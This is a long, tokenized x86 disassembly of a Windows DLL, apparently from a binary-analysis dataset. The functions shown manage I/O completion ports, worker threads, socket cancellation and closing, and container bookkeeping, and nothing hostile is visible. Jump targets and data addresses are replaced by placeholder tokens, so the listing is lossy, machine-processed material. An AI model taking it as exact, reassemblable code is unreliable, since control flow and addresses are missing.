mov edx [ eax + 0x2c ]
push edi
call edx
xor esi esi
push 0x14
mov [ esi + 0x8 ] 0x0
call sub_10012ca7
add esp 0x4
test eax eax
je r-xdata
push 0x0
push 0x0
push eax
push sub_10004f70
push 0x0
push 0x0
call [ CreateThread@IAT ]
mov [ edi + 0x8 ] eax
test eax eax
jne r-xdata
push r--data
lea edx [ ebp - 0x1a4 ]
push edx
mov [ ebp - 0x1a4 ] 0x10001
call sub_10013848
lea eax [ ebp - 0x1a4 ]
push eax
lea ecx [ ebp - 0x1b4 ]
mov [ ebp - 0x1a4 ] 0x0
call sub_10012808
push r--data
lea ecx [ ebp - 0x1b4 ]
push ecx
mov [ ebp - 0x1b4 ] r--data
call sub_10013848
mov [ esi + 0x4 ] eax
mov [ eax ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x8 ] eax
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x10 ] bl
mov edx [ esi + 0x4 ]
mov [ edx + 0x11 ] bl
jmp r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10012771
mov esp ebp
pop ebp
retn
push r--data
lea eax [ ebp - 0x1a4 ]
push eax
mov [ ebp - 0x1a4 ] 0x10001
call sub_10013848
push 0x0
push 0x0
push 0x0
mov [ ebp - 0x4 ] bl
push 0xffffffff
mov [ edi + 0x4 ] esi
call [ CreateIoCompletionPort@IAT ]
mov [ edi + 0xc ] eax
test eax eax
jne r-xdata
sub_100051a0
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_100051d0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10012c4b
add esp 0x4
sub_100051d0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c78b
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x10 ] edi
mov [ edi ] r--data
mov [ ebp - 0x4 ] 0x1
mov eax [ edi + 0x8 ]
xor esi esi
push esi
push eax
call [ TerminateThread@IAT ]
mov ecx [ edi + 0x8 ]
push 0xffffffff
push ecx
call [ WaitForSingleObject@IAT ]
mov edx [ edi + 0x8 ]
mov ebx [ CloseHandle@IAT ]
push edx
call ebx
mov eax [ edi + 0xc ]
push eax
call ebx
mov ebx [ edi + 0x4 ]
mov [ ebp - 0x14 ] ebx
cmp ebx esi
je r-xdata
mov eax [ edi + 0x14 ]
cmp eax esi
je r-xdata
mov [ ebp - 0x4 ] 0x2
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea esi [ ebp - 0x18 ]
mov eax ebx
call sub_10001d00
mov ecx [ ebx + 0x4 ]
push ecx
call sub_10012c4b
push ebx
call sub_10012c4b
add esp 0x8
xor esi esi
mov [ edi + 0x14 ] esi
mov [ edi + 0x18 ] esi
mov [ edi + 0x1c ] esi
mov [ edi ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push eax
call sub_10012c4b
add esp 0x4
sub_100052c0
push ebp
mov ebp esp
sub esp 0x8
push esi
mov esi eax
mov eax [ edi + 0xc ]
mov edx [ esi ]
push 0x0
push esi
push eax
mov eax [ edx + 0x8 ]
mov ecx esi
call eax
push eax
call [ CreateIoCompletionPort@IAT ]
lea ecx [ ebp - 0x4 ]
mov [ ebp - 0x4 ] esi
mov esi [ edi + 0x4 ]
push ecx
call sub_10002350
push eax
push esi
lea esi [ ebp - 0x8 ]
call sub_10005630
pop esi
mov esp ebp
pop ebp
retn
sub_10005300
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x14
push ebx
push esi
mov esi ecx
push edi
mov [ esp + 0xc ] esi
mov ecx [ esi + 0x10 ]
mov edx [ ecx ]
mov eax [ edx + 0x1c ]
call eax
mov ecx [ esi + 0x10 ]
mov edx [ ecx ]
mov eax [ edx + 0x24 ]
call eax
jmp r-xdata
mov ecx [ esp + 0x10 ]
cmp ecx edi
je r-xdata
push 0xffffffff
lea eax [ esp + 0x1c ]
push eax
mov eax [ esi + 0xc ]
lea ecx [ esp + 0x18 ]
push ecx
lea edx [ esp + 0x20 ]
xor edi edi
push edx
push eax
mov [ esp + 0x28 ] edi
mov [ esp + 0x24 ] edi
mov [ esp + 0x2c ] edi
call [ GetQueuedCompletionStatus@IAT ]
test eax eax
je r-xdata
push edi
call sub_10012d27
add esp 0x4
mov ebx edx
mov edi eax
mov eax [ esi + 0x4 ]
push ebx
push edi
call sub_10004f00
mov eax [ esp + 0xc ]
mov eax [ eax + 0x18 ]
mov esi [ esi + 0x14 ]
mov [ esp + 0x1c ] eax
cmp esi eax
je r-xdata
mov eax [ esp + 0x14 ]
mov edx [ ecx ]
mov edx [ edx ]
push eax
mov eax [ esp + 0x1c ]
push eax
call edx
jmp r-xdata
mov esi [ esp + 0xc ]
mov ecx [ esi ]
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
push ebx
push edi
call eax
add esi 0x4
cmp esi [ esp + 0x1c ]
jne r-xdata
sub_100053c0
push esi
mov esi eax
mov edx [ esi ]
mov eax [ esi + 0x4 ]
sub eax edx
sar eax 0x2
cmp eax 0x3ffffffe
jbe r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edx
inc eax
sar ecx 0x2
cmp eax ecx
jbe r-xdata
push r--data
call sub_100126ab
pop esi
retn
push edi
mov edx ecx
shr edx 0x1
mov edi 0x3fffffff
sub edi edx
cmp edi ecx
pop edi
jae r-xdata
add ecx edx
xor ecx ecx
jmp r-xdata
push ecx
call sub_1000a390
mov ecx eax
cmp ecx eax
jae r-xdata
sub_10005410
push ebp
mov ebp esp
mov edx [ eax + 0x4 ]
mov ecx [ edx + 0x4 ]
cmp [ ecx + 0x11 ] 0x0
push ebx
push esi
mov ebx edx
jne r-xdata
cmp [ edx + 0x11 ] 0x0
je r-xdata
mov esi [ ebp + 0xc ]
push edi
mov edi [ esi ]
lea esp [ esp ]
mov ecx [ edx ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + 0x4 ]
jmp r-xdata
cmp [ edx + 0x11 ] 0x0
je r-xdata
mov ecx [ ecx + 0x8 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
pop esi
mov [ eax ] ebx
mov [ eax + 0x4 ] edx
pop ebx
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
mov esi [ eax ]
mov edi edi
cmp [ ecx + 0x11 ] 0x0
jne r-xdata
mov ebx ecx
mov ecx [ ecx ]
cmp edi esi
jae r-xdata
cmp [ ecx + 0x11 ] 0x0
je r-xdata
mov ecx [ ecx + 0x8 ]
mov edx ecx
mov ecx [ ecx ]
jmp r-xdata
mov esi [ ecx + 0xc ]
cmp esi edi
jae r-xdata
pop edi
mov edx ecx
cmp esi [ ecx + 0xc ]
jae r-xdata
cmp [ ecx + 0x11 ] 0x0
je r-xdata
sub_100054a0
mov ecx [ eax ]
cmp [ ecx + 0x11 ] 0x0
jne r-xdata
retn
mov edx [ ecx + 0x8 ]
cmp [ edx + 0x11 ] 0x0
jne r-xdata
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x11 ] 0x0
jne r-xdata
mov ecx [ edx ]
cmp [ ecx + 0x11 ] 0x0
jne r-xdata
mov [ eax ] ecx
mov edx [ eax ]
cmp edx [ ecx + 0x8 ]
jne r-xdata
mov [ eax ] edx
retn
lea esp [ esp ]
mov [ eax ] ecx
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x11 ] 0x0
je r-xdata
mov edx ecx
mov ecx [ edx ]
cmp [ ecx + 0x11 ] 0x0
je r-xdata
sub_100054f0
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
cmp ecx 0x3fffffff
ja r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_10012808
push r--data
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] r--data
call sub_10013848
lea eax [ ecx * 4 ]
push eax
call sub_10012ca7
add esp 0x4
test eax eax
jne r-xdata
sub_10005550
push ebp
mov ebp esp
mov eax [ ecx + 0x8 ]
mov edx [ eax ]
mov [ ecx + 0x8 ] edx
mov edx [ eax ]
cmp [ edx + 0x11 ] 0x0
jne r-xdata
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x4 ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
cmp ecx [ edx ]
jne r-xdata
mov [ edx + 0x4 ] eax
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
mov [ edx + 0x8 ] eax
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
mov [ edx ] eax
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
sub_100055b0
push ebp
mov ebp esp
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
mov [ ecx ] edx
mov edx [ eax + 0x8 ]
cmp [ edx + 0x11 ] 0x0
jne r-xdata
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x4 ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov [ edx + 0x4 ] eax
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
mov [ edx ] eax
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
mov [ edx + 0x8 ] eax
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
sub_10005630
push ebp
mov ebp esp
sub esp 0x8
mov edx [ ebp + 0x8 ]
push ebx
push edi
mov edi [ edx + 0x4 ]
mov eax [ edi + 0x4 ]
cmp [ eax + 0x11 ] 0x0
mov cl 0x1
mov [ ebp - 0x8 ] cl
jne r-xdata
mov ebx edi
mov [ ebp - 0x4 ] ebx
test cl cl
je r-xdata
mov ecx [ ebp + 0xc ]
mov ebx [ ecx + 0xc ]
mov eax [ ebp + 0xc ]
mov ecx [ ebx + 0xc ]
push eax
cmp ecx [ eax + 0xc ]
jae r-xdata
mov eax [ edx + 0x4 ]
cmp edi [ eax ]
jne r-xdata
mov eax [ eax + 0x8 ]
mov eax [ eax ]
jmp r-xdata
call sub_10012c4b
add esp 0x4
pop edi
mov [ esi ] ebx
mov [ esi + 0x4 ] 0x0
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp + 0xc ]
push ecx
mov ecx edi
mov ebx edx
call sub_10002130
mov edx [ eax ]
pop edi
mov [ esi ] edx
mov [ esi + 0x4 ] 0x1
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x4 ]
call sub_10005700
mov ebx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push ecx
push 0x1
lea eax [ ebp + 0xc ]
push eax
mov ecx edi
mov ebx edx
call sub_10002130
mov ecx [ eax ]
pop edi
mov [ esi ] ecx
mov [ esi + 0x4 ] 0x1
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp ebx [ eax + 0xc ]
mov edi eax
setb cl
mov [ ebp - 0x8 ] cl
test cl cl
je r-xdata
cmp [ eax + 0x11 ] 0x0
je r-xdata
sub_10005700
mov ecx [ eax ]
cmp [ ecx + 0x11 ] 0x0
je r-xdata
mov edx [ ecx ]
cmp [ edx + 0x11 ] 0x0
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov [ eax ] ecx
retn
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x11 ] 0x0
jne r-xdata
mov ecx [ edx + 0x8 ]
cmp [ ecx + 0x11 ] 0x0
jne r-xdata
mov edx [ eax ]
cmp [ edx + 0x11 ] 0x0
jne r-xdata
mov edx [ eax ]
cmp edx [ ecx ]
jne r-xdata
mov [ eax ] edx
retn
nop
retn
mov [ eax ] ecx
mov [ eax ] ecx
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x11 ] 0x0
je r-xdata
mov edx ecx
mov ecx [ edx + 0x8 ]
cmp [ ecx + 0x11 ] 0x0
je r-xdata
sub_10005780
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
push 0x0
mov [ esi + 0x38 ] eax
call sub_10012d27
add esp 0x4
mov [ esi + 0x3c ] eax
pop esi
pop ebp
retn 0x4
sub_100057a0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi ecx
mov ecx [ esi + 0x8 ]
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
push edi
push ebx
call edx
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov ecx [ esi + 0x4 ]
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
push edi
push ebx
call edx
test eax eax
jne r-xdata
mov ecx [ esi + 0xc ]
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
push edi
push ebx
call edx
test eax eax
jne r-xdata
cmp [ esi + 0x10 ] eax
je r-xdata
mov ecx [ esi + 0x10 ]
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
push edi
push ebx
call edx
sub_10005800
push ebp
mov ebp esp
push 0xffffffff
push sub_1001ca0d
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov edi [ ebp + 0x8 ]
push edi
mov [ ebp - 0x4 ] 0x0
call sub_100024c0
mov [ edi + 0x8 ] r--data
lea esi [ edi + 0x8 ]
mov [ edi ] r--data
mov [ esi ] r--data
xor eax eax
mov [ edi + 0x24 ] r--data
mov [ edi + 0x28 ] eax
mov [ edi + 0x2c ] eax
mov [ edi + 0x30 ] eax
mov [ edi + 0x34 ] eax
mov [ ebp - 0x4 ] 0x2
push eax
mov [ edi + 0x38 ] 0x1e
call sub_10012d27
add esp 0x4
mov [ edi + 0x3c ] eax
cmp ebx 0xffffffff
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x14 ]
mov eax [ ebp + 0x18 ]
mov [ edi + 0x20 ] ecx
mov ecx [ ebp + 0x1c ]
mov [ edi + 0x28 ] edx
mov edx [ ebp + 0x20 ]
mov [ edi + 0x2c ] eax
mov [ edi + 0x30 ] ecx
mov [ edi + 0x34 ] edx
mov [ edi + 0x1c ] ebx
mov ebx [ edi + 0x20 ]
mov eax [ ebx + 0xc ]
mov edx [ esi ]
push 0x0
push esi
push eax
mov eax [ edx + 0x8 ]
mov ecx esi
call eax
push eax
call [ CreateIoCompletionPort@IAT ]
mov ebx [ ebx + 0x4 ]
lea ecx [ ebp + 0xc ]
mov [ ebp + 0xc ] esi
push ecx
mov esi ebx
call sub_10002350
push eax
push ebx
lea esi [ ebp - 0x14 ]
call sub_10005630
mov eax [ ebp + 0x30 ]
test eax eax
je r-xdata
push r--data
lea eax [ ebp + 0xc ]
push eax
mov [ ebp + 0xc ] 0x10001
call sub_10013848
xor eax eax
push edi
call eax
add esp 0x4
jmp r-xdata
push edi
mov [ edi + 0x18 ] eax
call [ ebp + 0x2c ]
push edi
mov [ edi + 0x14 ] eax
call [ ebp + 0x24 ]
push edi
mov [ edi + 0x10 ] eax
call [ ebp + 0x28 ]
mov [ edi + 0xc ] eax
add esp 0xc
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x2c
sub_10005930
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10005990
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10012c4b
add esp 0x4
sub_10005960
push esi
mov esi ecx
cmp [ esi + 0x18 ] 0x0
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
call edx
neg eax
sbb eax eax
inc eax
pop esi
retn
mov ecx [ esi + 0x18 ]
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
call edx
test eax eax
je r-xdata
xor eax eax
pop esi
retn
sub_10005990
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c74d
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x14 ] edi
lea eax [ edi + 0x8 ]
mov [ edi ] r--data
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x1
mov ecx [ edi + 0x20 ]
mov ebx [ ecx + 0x4 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x1c ]
push ecx
mov eax ebx
call sub_10005410
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x1c ]
push edx
push eax
lea esi [ ebp - 0x10 ]
mov eax ebx
call sub_10001d00
mov ecx [ edi + 0x1c ]
push ecx
call [ closesocket@IAT ]
mov ecx [ edi + 0x18 ]
test ecx ecx
je r-xdata
mov ecx [ edi + 0x14 ]
test ecx ecx
je r-xdata
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
mov ecx [ edi + 0xc ]
test ecx ecx
je r-xdata
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
mov ecx [ edi + 0x10 ]
test ecx ecx
je r-xdata
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
mov [ edi + 0x24 ] r--data
mov [ edi ] r--data
mov [ ebp - 0x4 ] 0x2
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
mov [ edi ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push eax
call sub_10001140
sub_10005a80
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi ]
mov edx [ eax + 0x18 ]
call edx
test eax eax
jne r-xdata
mov ecx [ esi + 0x10 ]
mov edx [ ecx ]
pop esi
mov edx [ edx + 0xc ]
pop ebp
jmp edx
push r--data
lea eax [ ebp + 0xc ]
push eax
mov [ ebp + 0xc ] 0x10005
call sub_10013848
sub_10005ad0
push esi
mov esi ecx
cmp [ esi + 0x18 ] 0x0
je r-xdata
mov ecx [ esi + 0x10 ]
mov eax [ ecx ]
mov edx [ eax + 0x10 ]
call edx
xor ecx ecx
cmp ecx eax
sbb eax eax
neg eax
pop esi
retn
mov ecx [ esi + 0x18 ]
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
call edx
test eax eax
je r-xdata
xor eax eax
pop esi
retn
sub_10005b00
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi ]
mov edx [ eax + 0x1c ]
call edx
test eax eax
jne r-xdata
mov ecx [ esi + 0xc ]
mov edx [ ecx ]
pop esi
mov edx [ edx + 0xc ]
pop ebp
jmp edx
push r--data
lea eax [ ebp + 0xc ]
push eax
mov [ ebp + 0xc ] 0x10005
call sub_10013848
sub_10005b40
push ebp
mov ebp esp
push edi
mov edi ecx
mov ecx [ edi + 0xc ]
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
call edx
test eax eax
jne r-xdata
pop edi
pop ebp
retn 0x4
mov eax [ edi + 0x30 ]
test eax eax
je r-xdata
mov ecx [ edi + 0x34 ]
add ecx eax
cmp ecx [ ebp + 0x8 ]
jae r-xdata
mov edx [ edi - 0x8 ]
mov eax [ edx + 0x8 ]
push esi
lea esi [ edi - 0x8 ]
push 0x0
mov ecx esi
call eax
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0xc ]
call eax
test eax eax
je r-xdata
mov ecx [ edi + 0x18 ]
mov ecx [ ecx + 0x10 ]
mov edx [ ecx ]
mov eax [ edx + 0x20 ]
push esi
call eax
pop esi
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x4 ]
push 0x3
call eax
sub_10005bb0
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10012c4b
add esp 0x4
sub_10005be0
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_10012771
mov esp ebp
pop ebp
retn
mov ecx [ esi + 0x4 ]
mov eax [ ecx + 0x8 ]
mov edx [ eax + 0x8 ]
add ecx 0x8
call edx
push eax
call [ CancelIo@IAT ]
mov ecx [ esi + 0x4 ]
push 0x0
push 0x0
lea edx [ ebp - 0x1c ]
push edx
push 0x4
lea eax [ ebp - 0x18 ]
push eax
push 0x10
add ecx 0x8
lea edx [ ebp - 0x14 ]
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x14 ] 0x7fda2e11
mov [ ebp - 0x10 ] 0x436f8630
mov [ ebp - 0xc ] 0x36f531a0
mov [ ebp - 0x8 ] 0x57c1eea6
mov [ ebp - 0x18 ] 0x0
mov eax [ ecx ]
push edx
mov edx [ eax + 0x8 ]
push 0xc8000006
call edx
push eax
call [ WSAIoctl@IAT ]
cmp [ ebp - 0x18 ] 0x0
je r-xdata
xor ecx ecx
lea eax [ esi + 0xc ]
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0x4 ]
mov eax [ ecx + 0x8 ]
mov edx [ eax + 0x8 ]
push 0x0
add ecx 0x8
push 0x0
push 0x0
call edx
push eax
call [ ebp - 0x18 ]
xor edx edx
lea edx [ ecx + 0x8 ]
jmp r-xdata
push eax
mov eax [ ecx + 0x20 ]
mov ecx [ eax + 0xc ]
push edx
push 0x0
push ecx
call [ PostQueuedCompletionStatus@IAT ]
mov [ esi + 0x8 ] 0x1
sub_10005cd0
push ebp
mov ebp esp
push 0x20
call sub_10012ca7
add esp 0x4
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0x0
pop ebp
retn
sub_10005d00
push ebp
mov ebp esp
lea eax [ ecx + 0xc ]
cmp [ ebp + 0x8 ] eax
jne r-xdata
xor eax eax
pop ebp
retn 0x8
mov ecx [ ecx + 0x4 ]
test ecx ecx
je r-xdata
mov eax 0x1
pop ebp
retn 0x8
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
push 0x1
call eax
sub_10005d30
push ebp
mov ebp esp
push 0xffffffff
push sub_1001ce98
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
mov ebx ecx
mov eax [ ebx + 0x18 ]
mov [ ebp - 0x30 ] eax
lea esi [ ebx + 0x8 ]
cmp edi eax
jb r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
push edi
push eax
push edx
call sub_10018b70
add esp 0xc
mov eax edi
xor ecx ecx
call sub_10002b40
mov eax edi
mov edx [ ebx ]
mov eax [ edx + 0x14 ]
mov ecx ebx
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] 0x0
call eax
mov eax [ ebp - 0x30 ]
jmp r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_10012c4b
add esp 0x4
push eax
push ecx
push edx
call sub_10018b70
xor eax eax
add esp 0xc
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x2c ] al
lea edi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] eax
call sub_10005ef0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10012771
mov esp ebp
pop ebp
retn 0x8
sub_10005e30
push ebp
mov ebp esp
push esi
mov esi ecx
lea eax [ esi + 0x28 ]
cmp [ ebp + 0x8 ] eax
jne r-xdata
xor eax eax
pop esi
pop ebp
retn 0x8
mov edx [ esi ]
mov eax [ edx + 0x18 ]
push edi
mov edi [ ebp + 0xc ]
push edi
mov [ esi + 0x24 ] 0x0
call eax
mov esi [ esi + 0x4 ]
test edi edi
pop edi
push 0x0
jne r-xdata
call sub_10012d27
mov edx [ esi ]
add esp 0x4
mov [ esi + 0x3c ] eax
mov eax [ edx + 0x8 ]
push 0x0
mov ecx esi
call eax
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0xc ]
call eax
test eax eax
je r-xdata
mov edx [ esi ]
mov eax [ edx + 0x8 ]
mov ecx esi
call eax
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0xc ]
call eax
test eax eax
je r-xdata
mov eax 0x1
pop esi
pop ebp
retn 0x8
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x4 ]
push 0x0
call eax
mov ecx [ esi + 0x20 ]
mov ecx [ ecx + 0x10 ]
mov edx [ ecx ]
mov eax [ edx + 0x20 ]
push esi
call eax
mov eax 0x1
pop esi
pop ebp
retn 0x8
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x4 ]
push 0x1
call eax
sub_10005ef0
cmp esi edi
je r-xdata
mov eax esi
retn
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
cmp [ edi + 0x14 ] 0x10
jae r-xdata
mov eax [ esi ]
push eax
call sub_10012c4b
add esp 0x4
mov edx [ edi ]
mov [ esi ] edx
mov [ edi ] 0x0
mov ecx [ edi + 0x10 ]
inc ecx
push ecx
push edi
push esi
call sub_100128c0
add esp 0xc
jmp r-xdata
mov eax [ edi + 0x10 ]
mov [ esi + 0x10 ] eax
mov ecx [ edi + 0x14 ]
mov [ esi + 0x14 ] ecx
mov [ edi + 0x10 ] 0x0
mov [ edi + 0x14 ] 0x0
sub_10005f60
push ebp
mov ebp esp
push 0xffffffff
push sub_1001d338
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
lea eax [ ebx + 0x28 ]
cmp [ ebp + 0x8 ] eax
jne r-xdata
xor eax eax
xor eax eax
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x2c ] al
lea esi [ ebx + 0x8 ]
lea edi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] eax
call sub_10005ef0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
xor esi esi
mov [ ebx + 0x24 ] esi
mov ebx [ ebx + 0x4 ]
mov edx [ ebx ]
mov eax [ edx + 0x8 ]
push esi
mov ecx ebx
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x2c ] 0x0
call eax
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0xc ]
call eax
cmp eax esi
je r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_10012c4b
add esp 0x4
mov eax 0x1
jmp r-xdata
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x4 ]
push 0x2
call eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10012771
mov esp ebp
pop ebp
retn 0x8
sub_10006030
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
mov esi ecx
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ esi + 0x8 ]
call sub_10002a60
mov edx [ esi ]
mov eax [ edx + 0x10 ]
mov ecx esi
call eax
pop esi
pop ebp
retn 0x8
sub_10006070
push esi
mov esi ecx
mov eax [ esi + 0x14 ]
push eax
call [ CancelIo@IAT ]
lea eax [ esi + 0x34 ]
xor ecx ecx
mov [ eax ] ecx
